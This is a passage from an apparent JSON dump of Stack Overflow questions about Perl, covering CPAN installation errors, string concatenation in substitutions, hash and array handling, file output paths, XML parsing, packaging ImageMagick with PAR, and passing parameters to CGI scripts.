datatype (1.66 is represented as 1.66666666... ?), but how should i form then my queries, when i use placeholders in DBI?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":13075687,"title":"concatenating strings in Perl substitute expression","body":"<p>I have a string having a repeating pattern, and I want to replace each occurrence of such pattern with another string. The replacement string is formed by concatenating a set of other strings. An example is as below. I first tried concatenating using the <code>.</code> operator as shown.</p>\n\n<p>But the output contained the dots themselves, so Perl does not treat it as an operator, but a literal <code>.</code>.</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\n\nmy $start = 'not-so-';\nmy $end = '-but-a-little-bad';\nmy $string = 'I am a good boy. Infact I am a very good boy';\nprint \"Before: $string\\n\";\n&gt;&gt;&gt;&gt; $string =~ s/(good)/$start.$1.$end/g;\nprint \"Later : $string\\n\";\n</code></pre>\n\n<p>So I removed the <code>.</code>s, and my statement became <code>$string =~ s/(good)/$start$1$end/g;</code>, and the output is as per expectation. But, I feel a statement like this might cause maintenance issues later.</p>\n\n<p>My question: Is there a better way of concatenating strings other than this? </p>\n"},{"tags":["perl","rest"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":39,"score":-2,"question_id":13074004,"title":"... architecting & implementing help w/ Perl & REST","body":"<p>I really just need some basic software engineering architecting guidance... When I say 'architecting', I mean pseudo-code or statements I can go after in the Perl book I have, and hopefully some online examples...</p>\n\n<p>I'm using Perl and I'm trying to parse Medline/Pubmed file paths on an Unix system in order to finally pass the PMID from each path to a pmid2doi conversion website (<a href=\"http://www.pmid2doi.org/\" rel=\"nofollow\">http://www.pmid2doi.org/</a>).</p>\n\n<p>The structure of each link is a filepath of the form...</p>\n\n<pre><code>/xxxxx/xxxxx/xxxxx/xxxxx/xxxxx/UNC00000000000042/00223468/v45i3/S0022346809003820\n                                                |&lt;-PMID-&gt;|\n</code></pre>\n\n<p>where <code>00223468</code> is the PMID.</p>\n\n<pre><code>$ ls\n18507872 main.pdf main.raw main.xml\n</code></pre>\n\n<p>So far, I've got something that looks like this (in bash):</p>\n\n<pre><code>for doi in `find . -name \"*.xml\" | awk -F\\/ '{print $2}' `  #this extracts the PMID\ndo\n        echo  $doi\n        wget pmid2doi website\ndone\n</code></pre>\n\n<p>Now I need help translating it to Perl.</p>\n\n<p>The <em>pmid2doi</em> website requires inputting the PMID in order to get back the DOI.</p>\n\n<p>This is what I need to get running in Perl, and I need a little help in designing implementing this...</p>\n\n<p>Given your development background, I would be grateful for any insights, or recommended sites for generating regular expressions in Perl.</p>\n\n<p>thanks very much!</p>\n\n<p>Additionally:</p>\n\n<p>I see that the <em>pmid2doi</em> website says the REST API expects the website <em>plus</em> the DOI value.<br>\nSo I need to find some example Perl code that gets a REST value from a URL.<br>\nIn REST I just prepare the URL as specified and then the returned result should be the value I want.</p>\n"},{"tags":["perl","cpan","perl-module","opensuse","ppm"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13074644,"title":"Unable to install perl modules opensuse 12.2","body":"<p>I have been trying to install several perl modules on my brand new Opensuse installation, but to no avail. I have tried to install them both via CPAN, PPM and manually but keep incurring in the same error:</p>\n\n<pre><code> Unparsable version '' for prerequisite Test at Makefile.PL line 4.\n</code></pre>\n\n<p>nevertheless, <code>Makefile.PL</code> seems to be able to execute without problems, but the subsequent make execution incurrs into problems. This is the message causing the problem i think:</p>\n\n<pre><code> make: *** [LevenshteinXS.o] Error 127\n JGOLDBERG/Text-LevenshteinXS-0.03.tar.gz\n /usr/bin/make -- NOT OK\n</code></pre>\n\n<p>i tried to do a <code>whereis make</code> and the result seems ok:</p>\n\n<pre><code> make: /usr/bin/make /usr/bin/X11/make /usr/share/man/man1/make.1.gz /usr/share/man/man1p/make.1p.gz\n</code></pre>\n\n<p>here's the complete recount of the actions that cpan carries on before telling me that the installation failed:</p>\n\n<pre><code> CPAN: Storable loaded ok (v2.34)\n Reading '/home/tito/.cpan/Metadata'\n Database was generated on Wed, 24 Oct 2012 19:07:03 GMT\n Running install for module 'Text::LevenshteinXS'\n Running make for J/JG/JGOLDBERG/Text-LevenshteinXS-0.03.tar.gz\n CPAN: Digest::SHA loaded ok (v5.71)\n CPAN: Compress::Zlib loaded ok (v2.048)\n Checksum for /home/tito/.cpan/sources/authors/id/J/JG/JGOLDBERG/Text-LevenshteinXS-0.03.tar.gz ok\n CPAN: File::Temp loaded ok (v0.22)\n CPAN: Parse::CPAN::Meta loaded ok (v1.4404)\n CPAN: CPAN::Meta loaded ok (v2.120630)\n\n CPAN.pm: Building J/JG/JGOLDBERG/Text-LevenshteinXS-0.03.tar.gz\n\n Unparsable version '' for prerequisite Test at Makefile.PL line 4.\n Checking if your kit is complete...\n Looks good\n Writing Makefile for Text::LevenshteinXS\n Writing MYMETA.yml and MYMETA.json\n CPAN: Module::CoreList loaded ok (v2.66)\n cp LevenshteinXS.pm blib/lib/Text/LevenshteinXS.pm\n AutoSplitting blib/lib/Text/LevenshteinXS.pm (blib/lib/auto/Text/LevenshteinXS)\n /usr/bin/perl /usr/lib/perl5/5.16.0/ExtUtils/xsubpp  -typemap /usr/lib/perl5/5.16.0/ExtUtils/typemap  LevenshteinXS.xs &gt; LevenshteinXS.xsc &amp;&amp; mv LevenshteinXS.xsc LevenshteinXS.c\n Please specify prototyping behavior for LevenshteinXS.xs (see perlxs manual)\n cc -c   -D_REENTRANT -D_GNU_SOURCE -DPERL_USE_SAFE_PUTENV -fno-strict-aliasing -pipe -fstack-protector -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -fmessage-length=0 -O2 -Wall -D_FORTIFY_SOURCE=2 -fstack-protector -funwind-tables -fasynchronous-unwind-tables -g -Wall -pipe   -DVERSION=\\\"0.03\\\" -DXS_VERSION=\\\"0.03\\\" -fPIC \"-I/usr/lib/perl5/5.16.0/x86_64-linux-thread-multi/CORE\"   LevenshteinXS.c\n /bin/sh: cc: command not found\n make: *** [LevenshteinXS.o] Error 127\n JGOLDBERG/Text-LevenshteinXS-0.03.tar.gz\n /usr/bin/make -- NOT OK\n CPAN: YAML loaded ok (v0.84)\n Running make test\n  Can't test without successful make\n Running make install\n  Make had returned bad status, install seems impossible\n</code></pre>\n"},{"tags":["arrays","perl","hashes"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":13070681,"title":"Putting elements of arrays into array of hashes in Perl","body":"<p>Just for my own education, what are some neat ways to convert some arrays so that each one is associated with the key of a hash, and all those hashes end up in an array?</p>\n\n<p>To make things a bit clearer, assume I've got some arrays like these:</p>\n\n<pre><code>my @n = ( 1,    2,    3 );\nmy @f = ( 3.14, 1.21, 0.75 );\nmy @s = ( 'a',  'b',  'c' );\n</code></pre>\n\n<p>And I want an array of hashes looking like this:</p>\n\n<pre><code>my %h = ( number =&gt; 1, float =&gt; 3.14, string =&gt; 'a' );\n</code></pre>\n\n<p>Simple C-style iteration is an obvious solution:</p>\n\n<pre><code>for ( my $i = 0; $i &lt; @n; $i++ ) {\n    my %h = ();\n    $h{number} = $n[$i];\n    $h{float}  = $f[$i];\n    $h{string} = $s[$i];\n    push @a, \\%h;\n}\n</code></pre>\n\n<p>Slightly more Perlish:</p>\n\n<pre><code>for (0..$#n) {\n    push @c, { number =&gt; $n[$_], float =&gt; $f[$_], string =&gt; $s[$_] };\n}\n</code></pre>\n\n<p>Or if I want to be concise and don't care about destroying the arrays:</p>\n\n<pre><code>for (0..$#n) {\n    push @a, { number =&gt; shift @n, float =&gt; shift @f, string =&gt; shift @s };\n}\n</code></pre>\n\n<p>And with <code>List::MoreUtils</code>:</p>\n\n<pre><code>use List::MoreUtils qw (each_array);\nmy $it = each_array @n, @f, @s;\nwhile ( my ($n, $f, $s) = $it-&gt;() ) {\n    push @a, { number =&gt; $n, float =&gt; $f, string =&gt; $s };\n}\n</code></pre>\n\n<p>So in the spirit of TMTOWTDI, what other solutions am I missing?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":111,"score":4,"question_id":13064220,"title":"Strange perl syntax ( $$ ) in sub routine","body":"<p>What dose the <code>( $$ )</code> do in this code. I have programmed Perl for a long time but never came across this syntax until recently when I opened a very old Perl .plx file</p>\n\n<p>These rows prevent me from upgrading to a more modern Perl version.</p>\n\n<pre><code>sub help( $$ ){\n\n}\n</code></pre>\n\n<p>The reason it affects me is because I get an error message stating that the help function was called before it was declared. Any idea of how I can solve this without removing the ( $$ ) block??</p>\n"},{"tags":["linux","perl","bash","shell","awk"],"answer_count":11,"favorite_count":7,"up_vote_count":19,"down_vote_count":0,"view_count":4718,"score":19,"question_id":2702564,"title":"How can I quickly sum all numbers in a file?","body":"<p>I have a file which contains several thousand numbers, each on it's own line:</p>\n\n<pre><code>34\n42\n11\n6\n2\n99\n...\n</code></pre>\n\n<p>I'm looking to write a script which will print the sum of all numbers in the file. I've got a solution, but it's not very efficient. (It takes several minutes to run.) I'm looking for a more efficient solution. Any suggestions?</p>\n"},{"tags":["perl","install","cpan"],"answer_count":3,"favorite_count":6,"up_vote_count":13,"down_vote_count":0,"view_count":12357,"score":13,"question_id":540640,"title":"How can I install a CPAN module into a local directory?","body":"<p>I'm using a hosted Linux machine so I don't have permissions to write\ninto the <code>/usr/lib</code> directory.</p>\n\n<p>When I try to install a CPAN module by doing the usual:</p>\n\n<pre><code>perl Makefile.PL\nmake test\nmake install\n</code></pre>\n\n<p>That module is extracted to a <code>blib/lib/</code> folder. I have kept <code>use\nblib/lib/ModuleName</code> but it still the compiler says module can not be\nfound. I have tried copying the .pm file into local directory and kept\n<code>require ModuleName</code> but still it gives me some error.</p>\n\n<p>How can I install a module into some other directory and use it?</p>\n"},{"tags":["perl","perl-xs"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13072433,"title":"How do I embed Perl code inside perl-xs module?","body":"<p>I wrote a Perl module to create a binding for a shared library with h2xs. Simple and easy to do.</p>\n\n<p>However, I would now like to include some Perl helper with this module. How do I go about doing this? I would assume it needs to go in the \"blah.pm\" file - but this file is <em>generated</em> by the build.</p>\n\n<p>Is there an (easy) way to specify a body of code to be included in it?</p>\n"},{"tags":["perl","foreach"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":13061150,"title":"Perl, making output go where it should","body":"<p>It's a simple script that looks for files in spool/ and then processes them with a sister script. Then I want it to output the results of that into results/. </p>\n\n<p>Here's the problem, with the code i've written the rusults go in results/spool/ and that's not right. How can i make them go in results/ only?</p>\n\n<p>The $date_file i've been trying to use to make the output file contain the filename that it has processed. So im guessing there should be something to remove the /spool from that, but I can't get it sorted.</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse POSIX;\nmy $date = strftime \"%Y%m%d_%H%M.txt\", localtime;\n\nmy @files = &lt;spool/*.*&gt;;\nforeach $file (@files) {\n    my $date_file = $file;\n    system(\"$^X  wfreq.pl $file &gt;&gt; results/${date_file}_$date\");\n    unlink(\"$file\");\n}\n</code></pre>\n\n<p>Keep in mind Im real new at this...so be gentle :)</p>\n"},{"tags":["string","perl","split"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":6,"view_count":88,"score":-5,"question_id":13037891,"title":"Splitting a numerical string in Perl","body":"<p>I have a numerical string:</p>\n\n<pre><code>\"13245988\"\n</code></pre>\n\n<p>I want to split before and after consecutive numbers.</p>\n\n<p>Expected output is:</p>\n\n<pre><code>1\n32\n45\n988\n</code></pre>\n\n<p>Here is what I've tried:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nmy $a=\"132459\";\nmy @b=split(\"\",$a);\nmy $k=0;\nmy @c=();\nfor(my $i=0; $i&lt;=@b; $i++) {\n    my $j=$b[$i]+1;\n    if($b[$i] == $j) {\n        $c[$k].=$b[$i];\n    } else {\n        $k++;\n        $c[$k]=$b[$i];\n        $k++;\n    }\n}\nforeach my $z (@c) {\n    print \"$z\\n\";\n}\n</code></pre>\n"},{"tags":["perl","search","text","phrases"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":4,"view_count":87,"score":-2,"question_id":13068450,"title":"Phrase search in a text file","body":"<p>Given a phrase like \"I am searching for a text\" and one text file that contains the list of words. </p>\n\n<p>I have to find the whether each and every combination of the word present in the text file. </p>\n\n<p>For example, I have to search for the occurrence \"I\", \"I am\", \"I am searching\", \"I am searching for\", \"searching for\" etc. </p>\n\n<p>I prefer to write this in perl and I needed a optimal solution that runs faster.</p>\n\n<p>Example text file :</p>\n\n<pre><code>I \\n\nam searching \\n\nText \\n\nsearching for \\n \nsearching for a \\n\nfor searching       ---&gt; my program should not match this \netc\n</code></pre>\n"},{"tags":["perl","facebook-graph-api"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":43,"score":2,"question_id":12786356,"title":"Facebook return ID and me.name","body":"<p>I am really lost with these two problems with Facebook API...</p>\n\n<p>All has been working fine posting to user walls, but I have one client with a page. The page was created from scratch, not via themselves as a user - ie they did not login and create a page they just started from the Facebook welcome screen>create page.</p>\n\n<p>There page works fine, however,</p>\n\n<p>1) Our system is submitting a post via API and receiving an ID in return (eg {\"id\":\"123456_123456\"} back from Facebook - this tells me facebook has accepted it and has given me an ID for the post.</p>\n\n<p>However, the post DOES NOT appear on the page it relates to (and I have checked where it is submitting it to and it is the correct User ID). This system has been working fine for all other users.</p>\n\n<p>2) When the login occurs via Javascript for this user, we get an empty value for \"me.name\" (we get me.email etc, just no name)</p>\n\n<p>Is all this normal, or do pages have a different technique to posting and retrieving data?</p>\n"},{"tags":["perl","hash","perl-hash"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":104,"score":2,"question_id":12998490,"title":"Can I create a hash key in perl like this (lowerR-10,UpperR-12) => 1","body":"<p>I want to create a hash key in perl hash key that looks like this (lowerR-10,UpperR-12) => 1.\n Here the key is (lowerR-10,UpperR-12) and its value is 1.</p>\n\n<p>Actually I have a file like this. I have to find the overlap among the the elements.</p>\n\n<p>A 10 12 </p>\n\n<p>A 10 15</p>\n\n<p>Whose output will be </p>\n\n<p>A 10 12 2</p>\n\n<p>A 12 15 1</p>\n\n<p>The last column shows the overlap among the elements.\nI would like to save the count in a hash for which I think the key should be like (lowerR-10,UpperR-12) this.\nIf anyone can give some new suggestion regarding how to save the key it will be great too.</p>\n\n<p>Thanks</p>\n"},{"tags":["perl","shell"],"answer_count":5,"favorite_count":7,"up_vote_count":5,"down_vote_count":3,"view_count":1815,"score":2,"question_id":1152400,"title":"How can I translate a shell script to Perl?","body":"<p>I have a shell script, pretty big one. Now my boss says I must rewrite it in Perl.\nIs there any way to write a Perl script and use the existing shell code as is in my Perl script. Something similar to <a href=\"http://search.cpan.org/perldoc/Inline::C\" rel=\"nofollow\">Inline::C</a>.</p>\n\n<p>Is there something like Inline::Shell? I had a look at inline module, but it supports only languages.</p>\n"},{"tags":["perl","oracle"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13069202,"title":"Regexp_like with placeholders perl","body":"<p>I need a query to pick up names that has any suffix from a-z. I know regexp_like can do this. But how should I use regexp_like with place holders?</p>\n\n<p><code>select id_name from name_table where regexp_like(name,'REM_45485[a-z]$');</code></p>\n\n<p>How should I use place holders in this  ? Thanks for all the suggestions. </p>\n"},{"tags":["perl","date","foreach","text-files"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":13059906,"title":"Saving output of a system call in perl to a text file","body":"<p>Im trying to make this script put the output files in results/ but i only get them in results/spool. How can I make them end up in the right place?</p>\n\n<pre><code> #!/usr/bin/perl -w\n\nuse POSIX;\nmy $date = strftime \"%Y%m%d_%H%M.txt\", localtime;\n\nmy @files = &lt;spool/*.*&gt;;\nforeach $file (@files) {\n    my $date_file = $file;\n    system(\"$^X  wfreq.pl $file &gt;&gt; results/${date_file}_$date\");\n    unlink(\"$file\");\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13063261,"title":"How to wrap the Image::Magick to PAR(perl)?","body":"<p>ImageMagick Download<br>\n<a href=\"http://www.imagemagick.org/script/binary-releases.php#windows\" rel=\"nofollow\">http://www.imagemagick.org/script/binary-releases.php#windows</a></p>\n\n<p>C:\\Program Files (x86)\\ImageMagick-6.8.0-Q16<br>\nin ALL Dll copy<br>\n*.dll  </p>\n\n<pre><code>use strict;\nuse warnings;\nmy $l;\nmy @dll=glob \"*.dll\";\n$l.=\" -l $_\" foreach(@dll);\n#print $l;\nprint `pp -v -o ss.exe$l img.pl`;\n</code></pre>\n\n<p>run image.exe<br>\n<strong>SUCESS!!!!</strong>  </p>\n\n<p>I also try gm.exe  </p>\n\n<h1>thanks people</h1>\n\n<p>=================================================================================</p>\n\n<p><strong>image.exe(double-click) completion does not create k.jpg<br>\nPlease tell me how to solve</strong><br>\nperl pp.pl  -> create \"image.exe\"</p>\n\n<p>perl image.pl -> create k.jpg<br>\nimage.exe(Double-click) -> can't create k.jpg<br></p>\n\n<p>image.pl</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Image::Magick;\nmy $img=Image::Magick-&gt;new;\n$img-&gt;Read('s.bmp');\n$img-&gt;Write('k.jpg');\n</code></pre>\n\n<p>pp.pl</p>\n\n<pre><code>use strict;\nuse warnings;\nmy $l;\nmy @dll=glob \"*.dll\";\n$l.=\" -l $_\" foreach(@dll);\nprint $l;\nprint `pp -v -o image.exe$l -M Image::Magick image.pl`;\n</code></pre>\n\n<p>Please tell me how to start the Imagemagick PAR<br><br>\n<strong>== dll List ==</strong>\n<br></p>\n\n<pre><code>-l analyze.dll -l atl100.dll -l CORE_RL_bzlib_.dll -l CORE_RL_coders_.dll -l CO\nRE_RL_filters_.dll -l CORE_RL_jbig_.dll -l CORE_RL_jp2_.dll -l CORE_RL_jpeg_.dll\n -l CORE_RL_lcms_.dll -l CORE_RL_libxml_.dll -l CORE_RL_Magick++_.dll -l CORE_RL\n_magick_.dll -l CORE_RL_png_.dll -l CORE_RL_tiff_.dll -l CORE_RL_ttf_.dll -l COR\nE_RL_wand_.dll -l CORE_RL_xlib_.dll -l CORE_RL_zlib_.dll -l IM_MOD_RL_aai_.dll -\nl IM_MOD_RL_art_.dll -l IM_MOD_RL_avs_.dll -l IM_MOD_RL_bgr_.dll -l IM_MOD_RL_bm\np_.dll -l IM_MOD_RL_braille_.dll -l IM_MOD_RL_cals_.dll -l IM_MOD_RL_caption_.dl\nl -l IM_MOD_RL_cin_.dll -l IM_MOD_RL_cip_.dll -l IM_MOD_RL_clip_.dll -l IM_MOD_R\nL_clipboard_.dll -l IM_MOD_RL_cmyk_.dll -l IM_MOD_RL_cut_.dll -l IM_MOD_RL_dcm_.\ndll -l IM_MOD_RL_dds_.dll -l IM_MOD_RL_debug_.dll -l IM_MOD_RL_dib_.dll -l IM_MO\nD_RL_djvu_.dll -l IM_MOD_RL_dng_.dll -l IM_MOD_RL_dot_.dll -l IM_MOD_RL_dps_.dll\n -l IM_MOD_RL_dpx_.dll -l IM_MOD_RL_emf_.dll -l IM_MOD_RL_ept_.dll -l IM_MOD_RL_\nexr_.dll -l IM_MOD_RL_fax_.dll -l IM_MOD_RL_fd_.dll -l IM_MOD_RL_fits_.dll -l IM\n_MOD_RL_fpx_.dll -l IM_MOD_RL_gif_.dll -l IM_MOD_RL_gradient_.dll -l IM_MOD_RL_g\nray_.dll -l IM_MOD_RL_hald_.dll -l IM_MOD_RL_hdr_.dll -l IM_MOD_RL_histogram_.dl\nl -l IM_MOD_RL_hrz_.dll -l IM_MOD_RL_html_.dll -l IM_MOD_RL_icon_.dll -l IM_MOD_\nRL_info_.dll -l IM_MOD_RL_inline_.dll -l IM_MOD_RL_ipl_.dll -l IM_MOD_RL_jbig_.d\nll -l IM_MOD_RL_jnx_.dll -l IM_MOD_RL_jp2_.dll -l IM_MOD_RL_jpeg_.dll -l IM_MOD_\nRL_label_.dll -l IM_MOD_RL_mac_.dll -l IM_MOD_RL_magick_.dll -l IM_MOD_RL_map_.d\nll -l IM_MOD_RL_mat_.dll -l IM_MOD_RL_matte_.dll -l IM_MOD_RL_meta_.dll -l IM_MO\nD_RL_miff_.dll -l IM_MOD_RL_mono_.dll -l IM_MOD_RL_mpc_.dll -l IM_MOD_RL_mpeg_.d\nll -l IM_MOD_RL_mpr_.dll -l IM_MOD_RL_msl_.dll -l IM_MOD_RL_mtv_.dll -l IM_MOD_R\nL_mvg_.dll -l IM_MOD_RL_null_.dll -l IM_MOD_RL_otb_.dll -l IM_MOD_RL_palm_.dll -\nl IM_MOD_RL_pango_.dll -l IM_MOD_RL_pattern_.dll -l IM_MOD_RL_pcd_.dll -l IM_MOD\n_RL_pcl_.dll -l IM_MOD_RL_pcx_.dll -l IM_MOD_RL_pdb_.dll -l IM_MOD_RL_pdf_.dll -\nl IM_MOD_RL_pes_.dll -l IM_MOD_RL_pict_.dll -l IM_MOD_RL_pix_.dll -l IM_MOD_RL_p\nlasma_.dll -l IM_MOD_RL_png_.dll -l IM_MOD_RL_pnm_.dll -l IM_MOD_RL_preview_.dll\n -l IM_MOD_RL_ps2_.dll -l IM_MOD_RL_ps3_.dll -l IM_MOD_RL_ps_.dll -l IM_MOD_RL_p\nsd_.dll -l IM_MOD_RL_pwp_.dll -l IM_MOD_RL_raw_.dll -l IM_MOD_RL_rgb_.dll -l IM_\nMOD_RL_rla_.dll -l IM_MOD_RL_rle_.dll -l IM_MOD_RL_scr_.dll -l IM_MOD_RL_sct_.dl\nl -l IM_MOD_RL_sfw_.dll -l IM_MOD_RL_sgi_.dll -l IM_MOD_RL_stegano_.dll -l IM_MO\nD_RL_sun_.dll -l IM_MOD_RL_svg_.dll -l IM_MOD_RL_tga_.dll -l IM_MOD_RL_thumbnail\n_.dll -l IM_MOD_RL_tiff_.dll -l IM_MOD_RL_tile_.dll -l IM_MOD_RL_tim_.dll -l IM_\nMOD_RL_ttf_.dll -l IM_MOD_RL_txt_.dll -l IM_MOD_RL_uil_.dll -l IM_MOD_RL_url_.dl\nl -l IM_MOD_RL_uyvy_.dll -l IM_MOD_RL_vicar_.dll -l IM_MOD_RL_vid_.dll -l IM_MOD\n_RL_viff_.dll -l IM_MOD_RL_wbmp_.dll -l IM_MOD_RL_webp_.dll -l IM_MOD_RL_wmf_.dl\nl -l IM_MOD_RL_wpg_.dll -l IM_MOD_RL_x_.dll -l IM_MOD_RL_xbm_.dll -l IM_MOD_RL_x\nc_.dll -l IM_MOD_RL_xcf_.dll -l IM_MOD_RL_xpm_.dll -l IM_MOD_RL_xps_.dll -l IM_M\nOD_RL_xtrn_.dll -l IM_MOD_RL_xwd_.dll -l IM_MOD_RL_ycbcr_.dll -l IM_MOD_RL_yuv_.\ndll -l mfc100.dll -l msvcp100.dll -l msvcr100.dll -l vcomp100.dll -l X11.dll -l\nXext.dll\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":62,"score":4,"question_id":13064926,"title":"Perl logging what scripts/modules accesses another module","body":"<p>We maintain a huge number of perl modules, actualy its so huge that we don't even know of all modules that we are responsible for. We would like to track what scripts and modules accesses another module in some sort of log, preferably stored by module name, so that we can evaluate whether its a risk to update a module and so that we can know what we might affect.</p>\n\n<p>Is there any simple way to do this?</p>\n"},{"tags":["perl","install","centos","lftp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13067722,"title":"lftp install unsuccessful","body":"<p>I try to install lftp on our CentOS 6 server.</p>\n\n<p>First I tried this:</p>\n\n<pre><code>yum install lftp\n</code></pre>\n\n<p>But I got: \"No package lftp available\"</p>\n\n<p>Second I downloaded rpm and tried to install it.</p>\n\n<pre><code>rpm -Uvh /root/src2/lftp-4.3.8-1.el6.rfx.x86_64.rpm\n</code></pre>\n\n<p>I got:\n\"error: Failed dependencies:\n    perl(String::CRC32) is needed by lftp-4.3.8-1.el6.rfx.x86_64\"</p>\n\n<p>I tried to resolve this by:</p>\n\n<pre><code>perl -MCPAN -e shell\n</code></pre>\n\n<p>and</p>\n\n<pre><code>install String::CRC32\n</code></pre>\n\n<p>(There was another issue, but I could solve it with installing YAML modul too)</p>\n\n<p>Finally it was successful.</p>\n\n<p>List of installed modules now (instmodsh):\n    Installed modules are:\n       ExtUtils::MakeMaker\n       Geography::Countries\n       IP::Country\n       Mail::SPF\n       Mail::SpamAssassin\n       Net::DNS::Resolver::Programmable\n       Perl\n       String::CRC32\n       YAML\n       razor-agents</p>\n\n<p>If I try to rerun rpm install, I got the same error message.\n\"error: Failed dependencies:\n    perl(String::CRC32) is needed by lftp-4.3.8-1.el6.rfx.x86_64\"</p>\n\n<p>How can I solve this?</p>\n"},{"tags":["algorithm","perl","tree","perl-data-structures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":13060130,"title":"how can tree like data structure be implemented in this case","body":"<p>I have a file like this </p>\n\n<pre><code>A 100 200\nA 120 220\nB 140 250\n</code></pre>\n\n<p>Another file is like this </p>\n\n<pre><code>A 130 210\nA 133 215\nB 180 270\n</code></pre>\n\n<p>Then I have to compare each row from first file to each row of second file and find which rows have intersecting co-ordinates </p>\n\n<p>Output will be like this</p>\n\n<pre><code>A 100 200 A 130 210\nA 100 200 A 133 215\nA 100 200 A 180 270\n</code></pre>\n\n<p>and it follows like that.</p>\n\n<p>In my code it code like this I get a first row from first file and compare with all row of second file.</p>\n\n<p>So I want to know how can I implement a tree like data structure to do this, so that complexity will be of log scale.</p>\n"},{"tags":["perl","file-io"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13066544,"title":"Perl script to merge multiple files line by line","body":"<p>Can anyone please help me with writing a Perl script which can take as input 5 text files and create a new text file with merging each row of all 5 files. \nShould this be done by opening 5 read streams at a time or like java some random file reader is available in Perl ?</p>\n\n<p>Thank You!</p>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":36,"score":-5,"question_id":13067232,"title":"How to change a service name of my product using perl and reading Productversion from registry?","body":"<p>I have a product with version 2.0.0.0 and the next version is 3.0.0.0. There was a change of service name in 3.0.0.0. And now the latest version  is 4.0.0. So i want to disable the service change code for 3.0.0.0 and keep it enabled to 2.0.0.0 and the previous versions.... We are using the perl script....</p>\n\n<p>Now I need the code to read the registry value of installed version and check the version installed.\nif it is 2.0.0.0, service name should be changed and for 3.0.0.0, it should not be changed..</p>\n\n<p>How to do that.? Need the perl script and for 64-bit windows.</p>\n"},{"tags":["perl","xpath"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13064732,"title":"extract a parent node if a specific child node does not exist using XML::LIB in perl","body":"<p>For example, my XML code is:</p>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;part&gt; \n      &lt;name&gt;qwe&lt;/name&gt;\n      &lt;ir&gt;\n          &lt;d&gt;yes&lt;/d&gt;\n          &lt;scalar&gt;\n              &lt;left&gt;31&lt;/left&gt;\n              &lt;right&gt;0&lt;/right&gt;\n          &lt;/scalar&gt;\n      &lt;/ir&gt;\n&lt;/part&gt;\n&lt;part&gt; \n      &lt;name&gt;qaz&lt;/name&gt;\n      &lt;ir&gt;\n          &lt;d&gt;yes&lt;/d&gt;\n          &lt;scalar&gt;\n              &lt;left&gt;1&lt;/left&gt;\n              &lt;right&gt;0&lt;/right&gt;\n          &lt;/scalar&gt;\n      &lt;/ir&gt;\n&lt;/part&gt;\n&lt;part&gt;\n      &lt;name&gt;asd&lt;/name&gt;\n      &lt;ir&gt;\n          &lt;d&gt;yes&lt;/d&gt;\n          &lt;drive&gt;\n              &lt;default&gt;1&lt;/default&gt;\n          &lt;/drive&gt;\n      &lt;/ir&gt;\n&lt;/part&gt;\n&lt;part&gt; \n      &lt;name&gt;zxc&lt;/name&gt;\n      &lt;ir&gt;\n          &lt;d&gt;no&lt;/d&gt;\n          &lt;scalar&gt;\n              &lt;left&gt;3&lt;/left&gt;\n              &lt;right&gt;0&lt;/right&gt;\n          &lt;/scalar&gt;\n          &lt;drive&gt;\n              &lt;default&gt;0&lt;/default&gt;\n          &lt;/drive&gt;\n      &lt;/ir&gt;\n&lt;/part&gt;\n</code></pre>\n\n<p>I want to extract all the names which don't have a node default, i.e. the output should be <code>qwe, qaz</code> in this example. You have to check the value of default value if it is 0 or 1 and print that <code>asd</code> has default 0 and <code>zzxc</code> has default 1. if it doesn't exist print that <code>qwe</code> has no default and <code>qaz</code> has no default value.  </p>\n"},{"tags":["html","perl","url-parameters"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":13063879,"title":"passing variables to perl script from html","body":"<p>I am trying to call a perl script from my HTML page. The way am trying to do is to call the url of the perl script located on the server. </p>\n\n<p>Here is the piece of code:</p>\n\n<p>HTML:</p>\n\n<pre><code>var fname = \"Bob\";\nvar url='http://xxx.com:30000/cgi-bin/abc.pl?title=fname';  \nwindow.open(url,\"_self\");                       \n</code></pre>\n\n<p>The way am trying to retrieve it in perl as:</p>\n\n<p>Perl:</p>\n\n<pre><code>print \"$ARGV[0]\\n\";\n</code></pre>\n\n<p>Now, I have 3 questions:</p>\n\n<ol>\n<li>I think this is the correct way to 